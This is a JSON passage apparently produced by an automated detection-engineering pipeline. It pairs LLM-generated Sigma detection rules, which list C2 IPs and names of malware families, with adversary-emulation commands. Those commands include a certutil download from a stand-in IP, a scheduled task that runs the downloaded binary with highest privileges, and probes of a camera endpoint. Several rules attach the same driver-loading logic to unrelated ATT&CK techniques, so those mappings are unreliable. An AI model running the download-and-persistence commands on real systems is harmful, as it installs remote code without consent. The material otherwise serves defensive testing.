        "id": "e530a40f-26bc-4be5-b1a7-8db21996551a",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 29,
          "query_time_ms": 407.0
        }
      },
      {
        "title": "Detect Driver Loading and C2 Communication for Exfiltration Over C2 Channel",
        "description": "Detects usage of sc.exe with kernel driver installation flags, PowerShell/cmd.exe invoking sc.exe for driver loading, registry modifications that point to kernel drivers, and network connections to known malicious C2 IP addresses.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "sc_driver": {
            "Image|endswith": "\\\\sc.exe",
            "CommandLine|contains": "type= kernel",
            "CommandLine|endswith": ".sys"
          },
          "ps_sc": {
            "Image|endswith": [
              "\\\\powershell.exe",
              "\\\\cmd.exe"
            ],
            "CommandLine|contains": "sc.exe.*type= kernel.*\\.sys"
          },
          "registry_driver": {
            "EventID": 13,
            "TargetObject|contains": "HKLM\\\\System\\\\CurrentControlSet\\\\Services",
            "Details|contains": ".sys"
          },
          "c2_ip": {
            "DestinationIp|is": [
              "14.43.108.22",
              "59.10.140.47",
              "59.127.10.132",
              "61.74.255.16",
              "122.116.165.62",
              "112.171.218.39",
              "114.34.10.80",
              "114.35.16.182",
              "114.35.191.224",
              "119.200.211.197",
              "121.128.198.233",
              "121.151.212.101",
              "122.116.234.73",
              "124.216.159.70",
              "175.200.146.227",
              "175.208.234.194",
              "175.214.193.170",
              "182.220.237.217",
              "210.123.140.200",
              "211.184.160.108",
              "220.132.106.193",
              "220.133.141.117"
            ]
          },
          "condition": "sc_driver or ps_sc or registry_driver or c2_ip"
        },
        "falsepositives": [
          "Legitimate administrative use of sc.exe to install signed drivers",
          "System updates or hardware drivers installed via sc.exe",
          "Authorized PowerShell or batch scripts that load drivers for internal tooling",
          "Enterprise software that registers services pointing to .sys files"
        ],
        "level": "high",
        "tags": [
          "attack.t1041",
          "attack.exfiltration",
          "attack.command_and_control"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "generation_method": "langchain",
        "id": "f8373f0e-b412-4b2f-895f-cfba216c3234",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 77,
          "query_time_ms": 619.0
        }
      },
      {
        "title": "Detect FastReverseProxy (FRP) Execution and Kernel Driver Installation via sc.exe",
        "description": "Detects execution of FastReverseProxy (FRP) binaries and usage of sc.exe with the \"type= kernel\" flag and a .sys driver file, including invocations from PowerShell or cmd.exe, indicative of Proxy C2 setup.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_frp": {
            "Image|endswith": "\\frp.exe"
          },
          "selection_sc": {
            "Image|endswith": "\\sc.exe"
          },
          "selection_sc_type": {
            "CommandLine|contains": "type= kernel"
          },
          "selection_sc_sys": {
            "CommandLine|contains": ".sys"
          },
          "selection_ps": {
            "Image|endswith": "\\powershell.exe"
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe"
          },
          "condition": "selection_frp or (selection_sc and selection_sc_type and selection_sc_sys) or (selection_ps and selection_sc_type and selection_sc_sys) or (selection_cmd and selection_sc_type and selection_sc_sys)"
        },
        "falsepositives": [
          "Legitimate administrators installing signed kernel drivers using sc.exe.",
          "Authorized use of FastReverseProxy for legitimate remote access or testing.",
          "PowerShell or batch scripts that install drivers as part of software deployment."
        ],
        "level": "high",
        "tags": [
          "attack.t1090",
          "attack.command_and_control",
          "attack.proxy",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Proxy",
        "generation_method": "langchain",
        "id": "43056f4c-b5d4-49f5-9107-90a26d0c45b5",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 131,
          "query_time_ms": 1741.0
        }
      },
      {
        "title": "Multi-hop Proxy and Kernel Driver Loading via sc.exe",
        "description": "Detects use of known proxy IPs, sc.exe loading kernel drivers, and registry modifications for driver services, indicating multi\u2011hop proxy C2 activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "proxy_ip": {
            "DestinationIp|in": [
              "14.43.108.22",
              "59.10.140.47",
              "59.127.10.132",
              "61.74.255.16",
              "122.116.165.62",
              "112.171.218.39",
              "114.34.10.80",
              "114.35.16.182",
              "114.35.191.224",
              "119.200.211.197",
              "121.128.198.233",
              "121.151.212.101",
              "122.116.234.73",
              "124.216.159.70",
              "175.200.146.227",
              "175.208.234.194",
              "175.214.193.170",
              "182.220.237.217",
              "210.123.140.200",
              "211.184.160.108",
              "220.132.106.193",
              "220.133.141.117"
            ]
          },
          "sc_driver": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "type= kernel",
            "CommandLine|endswith": ".sys"
          },
          "sc_invocation": {
            "CommandLine|re": "sc\\.exe.*type=\\s*kernel.*\\.sys"
          },
          "reg_service": {
            "Image|endswith": "\\reg.exe",
            "CommandLine|re": "add\\s+HKLM\\\\System\\\\CurrentControlSet\\\\Services.*type=\\s*kernel.*\\.sys"
          },
          "condition": "proxy_ip or sc_driver or sc_invocation or reg_service"
        },
        "falsepositives": [
          "Legitimate administrators installing or updating kernel drivers with sc.exe",
          "Authorized use of internal proxy servers that match the listed IP addresses",
          "System or third\u2011party software creating services that load kernel drivers via reg.exe"
        ],
        "level": "high",
        "tags": [
          "attack.t1090",
          "attack.t1543.003",
          "attack.command_and_control"
        ],
        "ttp_id": "unknown",
        "technique_name": "Proxy: Multi-hop Proxy",
        "generation_method": "langchain",
        "id": "d6218c22-cb1f-4827-a18e-fc48cec3487e",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 111,
          "query_time_ms": 1357.0
        }
      },
      {
        "title": "Remote System Discovery via Driver Loading and Reconnaissance Platform Usage",
        "description": "Detects execution of sc.exe or cmd.exe with kernel driver installation flags, PowerShell commands invoking known reconnaissance platforms, and registry modifications that add kernel driver services.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sc": {
            "Image|endswith": "sc.exe",
            "CommandLine|regex": "type= kernel.*\\\\.sys"
          },
          "selection_cmd": {
            "Image|endswith": "cmd.exe",
            "CommandLine|regex": "sc .*type= kernel.*\\\\.sys"
          },
          "selection_ps": {
            "Image|endswith": "powershell.exe",
            "CommandLine|regex": "(RecordedFuture|SecurityTrails|PolySwarm|TeamCymru)"
          },
          "selection_registry": {
            "Image|endswith": "reg.exe",
            "CommandLine|regex": "add HKLM\\\\System\\\\CurrentControlSet\\\\Services.*\\\\.sys"
          },
          "condition": "selection_sc or selection_cmd or selection_ps or selection_registry"
        },
        "falsepositives": [
          "Legitimate driver installations performed by IT or system updates using sc.exe",
          "Administrative scripts that load kernel drivers for maintenance",
          "Authorized PowerShell scripts that query security platforms for monitoring purposes",
          "Software installers that add services pointing to kernel drivers via reg.exe"
        ],
        "level": "high",
        "tags": [
          "attack.t1018",
          "attack.discovery",
          "attack.remote-system-discovery",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote System Discovery",
        "generation_method": "langchain",
        "id": "b8b5d69d-d424-4d64-b51b-f1f6a763f8df",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 118,
          "query_time_ms": 1099.0
        }
      },
      {
        "title": "Suspicious Kernel Driver Installation via sc.exe or Registry Modification",
        "description": "Detects execution of sc.exe with the \"type= kernel\" flag and a .sys driver file, especially when launched from PowerShell or cmd.exe, and detects reg.exe modifications of the Services registry key that include kernel driver registration. This behavior aligns with exploitation of public\u2011facing applications leading to malicious driver deployment.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "sc_kernel": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "type= kernel",
            "CommandLine|endswith": ".sys"
          },
          "ps_sc": {
            "ParentImage|endswith": "\\powershell.exe",
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "type= kernel"
          },
          "cmd_sc": {
            "ParentImage|endswith": "\\cmd.exe",
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "type= kernel"
          },
          "reg_kernel": {
            "Image|endswith": "\\reg.exe",
            "CommandLine|contains": "type= kernel"
          },
          "condition": "sc_kernel or ps_sc or cmd_sc or reg_kernel"
        },
        "falsepositives": [
          "Legitimate administrative installation of kernel drivers using sc.exe",
          "System administrators modifying service entries via reg.exe for valid drivers",
          "Automation scripts that deploy drivers during patching or hardware updates"
        ],
        "level": "high",
        "tags": [
          "attack.t1190",
          "attack.initial_access"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "generation_method": "langchain",
        "id": "046b4928-2768-45a3-ab80-dc36310452a3",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 118,
          "query_time_ms": 1537.0
        }
      },
      {
        "title": "Active Scanning: Kernel Driver Loading via sc.exe and Service Registry Modification",
        "description": "Detects execution of sc.exe with the \"type= kernel\" flag and a .sys driver file, including cases where sc.exe is launched from PowerShell or cmd.exe, and monitors registry modifications that register kernel drivers. This behavior aligns with active scanning techniques targeting critical infrastructure such as State Load Despatch Centres.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "sc_driver": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "type= kernel",
            "CommandLine|endswith": ".sys"
          },
          "sc_driver_ps": {
            "Image|endswith": "\\sc.exe",
            "ParentImage|endswith": "\\powershell.exe",
            "CommandLine|contains": "type= kernel",
            "CommandLine|endswith": ".sys"
          },
          "sc_driver_cmd": {
            "Image|endswith": "\\sc.exe",
            "ParentImage|endswith": "\\cmd.exe",
            "CommandLine|contains": "type= kernel",
            "CommandLine|endswith": ".sys"
          },
          "registry_driver": {
            "EventID": 13,
            "TargetObject|contains": "System\\CurrentControlSet\\Services",
            "Details|contains": ".sys"
          },
          "condition": "sc_driver or sc_driver_ps or sc_driver_cmd or registry_driver"
        },
        "falsepositives": [
          "Legitimate driver installations performed by system administrators",
          "Windows Update or system component installations that register kernel drivers",
          "IT staff using sc.exe to create or modify services without loading a driver",
          "Registry changes made by legitimate software installers that add services"
        ],
        "level": "medium",
        "tags": [
          "attack.t1595",
          "custom.reconnaissance",
          "custom.active-scanning",
          "custom.driver-loading"
        ],
        "ttp_id": "unknown",
        "technique_name": "Active Scanning",
        "generation_method": "langchain",
        "id": "67aece58-7413-4864-b02d-c9ce39c9c1f9",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 1433,
          "query_time_ms": 1170.0
        }
      },
      {
        "title": "Detect execution of ShadowPad, Poison Ivy, or RoyalRoad RTF weaponizer (User Execution)",
        "description": "Detects processes associated with ShadowPad, Poison Ivy, or RoyalRoad RTF weaponizer, as well as suspicious execution of RTF documents via WinWord, indicating possible user execution of malicious payloads.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_shadowpad": {
            "Image|contains": "shadowpad"
          },
          "selection_poisonivy": {
            "Image|contains": "poisonivy"
          },
          "selection_royalroad": {
            "Image|contains": "royalroad"
          },
          "selection_rtf": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "CommandLine|contains": ".rtf"
          },
          "condition": "selection_shadowpad or selection_poisonivy or selection_royalroad or selection_rtf"
        },
        "falsepositives": [
          "Legitimate use of Microsoft Word (WINWORD.EXE) to open RTF documents",
          "Internal or third\u2011party tools that happen to include the strings shadowpad, poisonivy, or royalroad in their filenames",
          "Security testing or red\u2011team tools named after the indicators"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1204"
        ],
        "ttp_id": "unknown",
        "technique_name": "User Execution",
        "generation_method": "langchain",
        "id": "5096f966-2734-4b8d-a9be-913390701325",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 831.0000000000001
        }
      },
      {
        "title": "Suspicious Use of Legitimate Credential Tools (Valid Accounts)",
        "description": "Detects execution of credential\u2011related utilities (runas, psexec, mstsc, ssh) or command lines containing explicit user specifications, indicating possible use of valid accounts for initial access or lateral movement.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\\\runas.exe"
          },
          "selection2": {
            "Image|endswith": "\\\\psexec.exe"
          },
          "selection3": {
            "Image|endswith": "\\\\mstsc.exe"
          },
          "selection4": {
            "Image|endswith": "\\\\ssh.exe"
          },
          "selection5": {
            "CommandLine|contains": "/user:"
          },
          "condition": "selection1 or selection2 or selection3 or selection4 or selection5"
        },
        "falsepositives": [
          "System administrators using runas, psexec, mstsc, or ssh for legitimate maintenance.",
          "Automated deployment scripts that invoke these utilities with explicit user parameters."
        ],
        "level": "medium",
        "tags": [
          "attack.t1078",
          "attack.initial_access",
          "attack.valid_accounts",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Valid Accounts",
        "generation_method": "langchain",
        "id": "4fd06d54-1169-4b6a-a32b-e0857e763411",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete",
          "events_found": 2,
          "query_time_ms": 731.0
        }
      },
      {
        "title": "Detection of ShadowPad Execution Indicative of Alternate Authentication Material Use",
        "description": "Detects execution of processes related to the ShadowPad backdoor, which may be used to obtain or use alternate authentication material for credential access.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|contains": "ShadowPad"
          },
          "selection2": {
            "CommandLine|contains": "ShadowPad"
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Internal security tools or testing frameworks that are deliberately named 'ShadowPad'.",
          "Red team exercises where the ShadowPad binary is used for authorized simulations."
        ],
        "level": "high",
        "tags": [
          "attack.t1555",
          "attack.credential_access"
        ],
        "ttp_id": "unknown",
        "technique_name": "Use Alternate Authentication Material",
        "generation_method": "langchain",
        "id": "a90ee93c-c08b-491d-8b26-a761e74d552a",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 1126.0
        }
      },
      {
        "title": "Obfuscated Files or Information \u2013 Kernel Driver Loading via sc.exe and Registry with Spoofed SSL Certificate",
        "description": "Detects attempts to load kernel drivers using sc.exe with the \"type= kernel\" flag, PowerShell or cmd.exe invoking sc.exe, creation or modification of Service registry keys indicating kernel drivers, and network connections presenting a known malicious SSL certificate fingerprint.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "sc_base": {
            "Image|endswith": "\\sc.exe"
          },
          "sc_kernel": {
            "CommandLine|contains": "type= kernel"
          },
          "sc_sys": {
            "CommandLine|contains": ".sys"
          },
          "ps_base": {
            "Image|endswith": "\\powershell.exe"
          },
          "ps_sc": {
            "CommandLine|contains": "sc.exe"
          },
          "cmd_base": {
            "Image|endswith": "\\cmd.exe"
          },
          "cmd_sc": {
            "CommandLine|contains": "sc.exe"
          },
          "reg_driver": {
            "TargetObject|contains": "HKLM\\System\\CurrentControlSet\\Services",
            "Details|contains": "type= kernel"
          },
          "tls_cert": {
            "CertificateSHA1": "0f6afc6e4e383883a6308fcf8d84b14a5bf4ccaf"
          },
          "condition": "(sc_base and sc_kernel and sc_sys) or ((ps_base and ps_sc) and sc_kernel) or ((cmd_base and cmd_sc) and sc_kernel) or reg_driver or tls_cert"
        },
        "falsepositives": [
          "Legitimate driver installations or updates using sc.exe with the type= kernel flag",
          "System or third\u2011party installers that modify Service registry keys to load kernel drivers",
          "Authorized Microsoft services presenting the same SSL certificate fingerprint",
          "Administrative scripts that install signed drivers via PowerShell or cmd.exe"
        ],
        "level": "medium",
        "tags": [
          "attack.t1027",
          "attack.defense_evasion",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "id": "bfd6a6a5-1383-4819-ac6c-2c44a3015539",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 70,
          "query_time_ms": 516.0
        }
      },
      {
        "title": "Suspicious PowerShell Execution from Office Applications (Phishing)",
        "description": "Detects PowerShell processes launched by Microsoft Word or Excel with encoded commands, indicative of malicious macro execution after a phishing email.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection2": {
            "ParentImage|endswith": "\\EXCEL.EXE",
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "whitelist": {
            "User|contains": "Administrator"
          },
          "condition": "(selection1 or selection2) and not whitelist"
        },
        "falsepositives": [
          "Legitimate use of macros by IT or power users that invoke PowerShell",
          "Scheduled maintenance scripts that run PowerShell from Office automation",
          "Administrative accounts running approved automation"
        ],
        "level": "medium",
        "tags": [
          "attack.t1566",
          "attack.initial_access",
          "custom.windows",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "generation_method": "langchain",
        "id": "8dd84482-331e-4291-9333-20cdd1957183",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 168,
          "query_time_ms": 508.0
        }
      },
      {
        "title": "Create or Modify System Process \u2013 Kernel Driver Service Installation",
        "description": "Detects creation or modification of kernel driver services via sc.exe commands or registry modifications that register a driver service, indicating persistence through kernel drivers.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sc": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "type= kernel",
            "CommandLine|endswith": ".sys"
          },
          "selection_ps": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "type= kernel",
            "CommandLine|endswith": ".sys"
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "type= kernel",
            "CommandLine|endswith": ".sys"
          },
          "selection_registry_path": {
            "TargetObject|startswith": "HKLM\\System\\CurrentControlSet\\Services"
          },
          "selection_registry_type": {
            "Details|contains": "type= kernel"
          },
          "selection_registry_sys": {
            "Details|contains": ".sys"
          },
          "condition": "selection_sc or selection_ps or selection_cmd or (selection_registry_path and selection_registry_type and selection_registry_sys)"
        },
        "falsepositives": [
          "Legitimate driver installations performed by administrators",
          "Windows Update or Microsoft hotfixes that add kernel drivers",
          "Software deployment tools (e.g., SCCM, PDQ) that install services",
          "Custom in\u2011house scripts that register services for legitimate purposes"
        ],
        "level": "high",
        "tags": [
          "attack.t1543.003",
          "attack.persistence",
          "attack.t1543",
          "custom.attack"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "id": "8cde13db-c694-4c99-b67d-43b5a1ca67ab",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 100,
          "query_time_ms": 1175.0
        }
      },
      {
        "title": "Detect Kernel Driver Loading for Network Service Discovery",
        "description": "Detects execution of sc.exe (or via PowerShell/cmd) with the \"type= kernel\" flag and a driver file, as well as registry modifications to the Services key indicating kernel driver registration, indicative of Network Service Discovery activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "sc_exe": {
            "Image|endswith": "\\sc.exe"
          },
          "ps_exe": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "sc.exe"
          },
          "cmd_exe": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "sc.exe"
          },
          "type_kernel": {
            "CommandLine|contains": "type= kernel"
          },
          "driver_sys": {
            "CommandLine|contains": ".sys"
          },
          "reg_key": {
            "TargetObject|contains": "HKLM\\System\\CurrentControlSet\\Services"
          },
          "condition": "(sc_exe and type_kernel and driver_sys) or (ps_exe and type_kernel and driver_sys) or (cmd_exe and type_kernel and driver_sys) or reg_key"
        },
        "falsepositives": [
          "Legitimate administrative scripts that install or query kernel drivers using sc.exe.",
          "System updates or driver installations that modify the Services registry key.",
          "Security or monitoring tools that enumerate services with sc.exe."
        ],
        "level": "high",
        "tags": [
          "attack.discovery",
          "attack.t1046",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Network Service Discovery",
        "generation_method": "langchain",
        "id": "812f063a-ff81-4f6c-86b6-1277aa57ca36",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 90,
          "query_time_ms": 485.0
        }
      },
      {
        "title": "Archive Collected Data via Command\u2011Line Archiving Tools",
        "description": "Detects use of common archiving utilities or PowerShell compression commands that may indicate collection and packaging of data for exfiltration (ATT&CK T1560).",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_tar": {
            "Image|endswith": "\\\\tar.exe",
            "CommandLine|contains": ".tar"
          },
          "selection_zip": {
            "Image|endswith": "\\\\zip.exe",
            "CommandLine|contains": ".zip"
          },
          "selection_7z": {
            "Image|endswith": "\\\\7z.exe",
            "CommandLine|contains": ".7z"
          },
          "selection_gzip": {
            "Image|endswith": "\\\\gzip.exe",
            "CommandLine|contains": ".gz"
          },
          "selection_rar": {
            "Image|endswith": "\\\\rar.exe",
            "CommandLine|contains": ".rar"
          },
          "selection_compress": {
            "CommandLine|contains": "compress"
          },
          "selection_pscompress": {
            "Image|endswith": "\\\\powershell.exe",
            "CommandLine|contains": "Compress-Archive"
          },
          "condition": "selection_tar or selection_zip or selection_7z or selection_gzip or selection_rar or selection_compress or selection_pscompress"
        },
        "falsepositives": [
          "Legitimate system or admin backup scripts that compress logs or files",
          "User\u2011initiated compression of files via built\u2011in Windows tools (e.g., File Explorer's \"Send to > Compressed (zipped) folder\")",
          "Scheduled tasks that rotate logs using archiving utilities"
        ],
        "level": "medium",
        "tags": [
          "attack.t1560",
          "attack.collection",
          "custom.attack"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "56b4837f-6432-4ff6-8c96-a8502649a298",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 2,
          "query_time_ms": 427.0
        }
      },
      {
        "title": "Malicious Driver Installation via sc.exe and Registry Service Modification",
        "description": "Detects execution of sc.exe with kernel driver installation flags, PowerShell or cmd.exe launching sc.exe, and registry modifications creating services that point to kernel driver files.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sc_type": {
            "Image|endswith": "\\\\sc.exe",
            "CommandLine|contains": "type= kernel"
          },
          "selection_sc_sys": {
            "Image|endswith": "\\\\sc.exe",
            "CommandLine|contains": ".sys"
          },
          "selection_parent_ps": {
            "ParentImage|endswith": "\\\\powershell.exe",
            "Image|endswith": "\\\\sc.exe"
          },
          "selection_parent_cmd": {
            "ParentImage|endswith": "\\\\cmd.exe",
            "Image|endswith": "\\\\sc.exe"
          },
          "selection_registry": {
            "TargetObject|contains": "HKLM\\\\System\\\\CurrentControlSet\\\\Services",
            "Details|contains": ".sys"
          },
          "condition": "(selection_sc_type and selection_sc_sys) or selection_parent_ps or selection_parent_cmd or selection_registry"
        },
        "falsepositives": [
          "Legitimate driver installations using sc.exe (e.g., signed drivers from vendors)",
          "Windows Update or OS component installations that install kernel drivers",
          "Administrative scripts that deploy drivers via sc.exe",
          "System administrators creating services that reference .sys files"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1204.002",
          "attack.t1543.003"
        ],
        "ttp_id": "unknown",
        "technique_name": "User Execution: Malicious File",
        "generation_method": "langchain",
        "id": "2153e479-42fa-4089-bea4-76430769843d",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 110,
          "query_time_ms": 1606.0
        }
      }
    ],
    "status": "success"
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "average_quality_score": 0.8294117647058823
    }
  },
  "attacks": [
    {
      "id": "923e8e53-69fc-462e-abda-caf860e1a039",
      "ttp_id": "52a67f56-f18b-4d14-a28a-fb6392ba85fb",
      "technique_id": "52a67f56-f18b-4d14-a28a-fb6392ba85fb",
      "technique_name": "Compromise Infrastructure",
      "tactic": "Resource Development",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://192.0.2.1/test.bin %TEMP%\\device_emulator.bin",
      "description": "Download a test binary file from a mock infrastructure device (e.g., IP camera) using certutil, a built-in Windows tool.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Attempts to download a file from a local mock server; fails silently if unreachable. File saved to %TEMP% if successful.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:38.644770",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.769,
      "validated": true
    },
    {
      "id": "5881cc71-21f3-4e61-919e-0b86357a1f1f",
      "ttp_id": "52a67f56-f18b-4d14-a28a-fb6392ba85fb",
      "technique_id": "52a67f56-f18b-4d14-a28a-fb6392ba85fb",
      "technique_name": "Compromise Infrastructure",
      "tactic": "Resource Development",
      "platform": "windows",
      "command": "schtasks.exe /create /tn \"CameraServiceUpdate\" /tr \"cmd.exe /c %TEMP%\\device_emulator.bin\" /sc onlogon /rl highest",
      "description": "Create a scheduled task that runs the downloaded binary at user logon with highest privileges, simulating persistence on compromised infrastructure.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a scheduled task named 'CameraServiceUpdate' that runs on user logon with elevated privileges. Requires admin rights to create task with highest privileges.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:38.645876",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.769,
      "validated": true
    },
    {
      "id": "41fac577-e0ac-4fdd-92b3-de0e24fe155c",
      "ttp_id": "52a67f56-f18b-4d14-a28a-fb6392ba85fb",
      "technique_id": "52a67f56-f18b-4d14-a28a-fb6392ba85fb",
      "technique_name": "Compromise Infrastructure",
      "tactic": "Resource Development",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\CameraLogs' -ErrorAction SilentlyContinue; $content = 'Device: DVR-01, Status: Active, LastPing: $(Get-Date)'; Set-Content -Path '%TEMP%\\CameraLogs\\status.log' -Value $content -Force\"",
      "description": "Simulate a compromised device writing status logs to a local directory, using PowerShell to create directory and write file.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a 'CameraLogs' directory in %TEMP% and writes a mock status log file. Safe and non-destructive; uses built-in PowerShell cmdlets with proper error handling.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:38.645876",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.769,
      "validated": true
    },
    {
      "id": "ce475fda-766d-4622-9643-54d24da7a236",
      "ttp_id": "52a67f56-f18b-4d14-a28a-fb6392ba85fb",
      "technique_id": "52a67f56-f18b-4d14-a28a-fb6392ba85fb",
      "technique_name": "Compromise Infrastructure",
      "tactic": "Resource Development",
      "platform": "linux",
      "command": "nc -zv 192.168.1.100 80",
      "description": "Basic reconnaissance: Check if port 80 is open on a target IP camera/DVR device",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Attempts TCP connection to port 80 on 192.168.1.100; outputs success or failure. No data is sent. Uses netcat, a common built-in tool for network probing.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:40.049713",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.769,
      "validated": true
    },
    {
      "id": "972d616d-b1da-48f8-bea4-673728b550c2",
      "ttp_id": "52a67f56-f18b-4d14-a28a-fb6392ba85fb",
      "technique_id": "52a67f56-f18b-4d14-a28a-fb6392ba85fb",
      "technique_name": "Compromise Infrastructure",
      "tactic": "Resource Development",
      "platform": "linux",
      "command": "curl -s -X GET http://192.168.1.100/cgi-bin/status | grep 'DeviceType'",
      "description": "Intermediate reconnaissance: Fetch device status page from a vulnerable IP camera CGI interface and extract device information",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends HTTP GET request to a known CGI endpoint on the target. Filters response for device type. Simulates fingerprinting of compromised infrastructure. Uses curl and grep, commonly present on Linux systems.",
      "source": "langchain",
      "generated_at": "2025-12-28T13:50:40.049713",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.769,
      "validated": true
    },
    {
      "id": "2876d914-d957-499d-b979-43bb66071fd7",
      "ttp_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
      "technique_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
      "technique_name": "Application Layer Protocol - Web Protocols",
      "tactic": "Command and Control",
      "platform": "windows",
